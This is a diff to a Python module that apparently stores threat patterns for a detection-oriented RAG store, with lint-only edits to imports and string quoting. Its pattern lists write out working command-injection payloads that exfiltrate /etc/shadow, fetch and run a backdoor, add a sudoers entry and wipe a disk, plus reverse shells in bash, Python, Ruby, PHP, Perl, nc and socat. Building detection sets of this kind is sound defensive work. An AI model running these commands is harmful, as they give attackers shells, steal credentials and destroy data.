@@ -25,10 +25,10 @@ _PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 if _PROJECT_ROOT not in sys.path:
     sys.path.insert(0, _PROJECT_ROOT)
 
-from pydal import DAL
+from pydal import DAL  # noqa: E402
 
-from shared.utils.embedding_manager import EmbeddingConfig, EmbeddingManager
-from shared.utils.rag_integration import Document, PgvectorRAGStore
+from shared.utils.embedding_manager import EmbeddingConfig, EmbeddingManager  # noqa: E402
+from shared.utils.rag_integration import Document, PgvectorRAGStore  # noqa: E402
 
 logger = logging.getLogger(__name__)
 
@@ -55,7 +55,7 @@ THREAT_PATTERNS: Dict[str, List[str]] = {
         "| nc attacker.example.com 4444 -e /bin/sh",
         "`wget http://malware.example.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd`",
         "&& cat /etc/shadow | base64 | curl -X POST -d @- http://exfil.example.com",
-        "|| python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"evil.example.com\",1234));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+        '|| python3 -c \'import socket,subprocess;s=socket.socket();s.connect(("evil.example.com",1234));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\'',
         "; echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
         "$(dd if=/dev/urandom of=/dev/sda bs=1M count=1024)",
     ],
@@ -71,11 +71,11 @@ THREAT_PATTERNS: Dict[str, List[str]] = {
     ],
     "reverse_shell": [
         "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
-        "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.0.0.1\",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+        'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'',
         "nc -e /bin/sh 10.0.0.1 4242",
-        "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-        "php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-        "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
+        'ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+        'php -r \'$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");\'',
+        'perl -e \'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
         "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f",
         "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242",
     ],
